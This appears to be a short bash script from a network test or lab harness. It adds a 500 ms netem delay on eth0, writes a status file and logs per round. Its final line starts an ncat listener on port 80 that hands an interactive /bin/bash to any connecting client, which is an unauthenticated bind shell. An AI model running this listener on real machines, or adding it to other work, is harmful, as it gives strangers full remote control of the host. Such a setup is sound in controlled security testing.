#!/bin/bash

num=$1
total=$2
round=$3
shared_dir=$4
loop=0

echo "I'm listening" > "/purple/results/data.txt"

tc qdisc add dev eth0 root netem delay 500ms

ncat -e "/bin/bash -is" -o "/$shared_dir/results/${round}/listen_$HOSTNAME.txt" -l 80 -k &

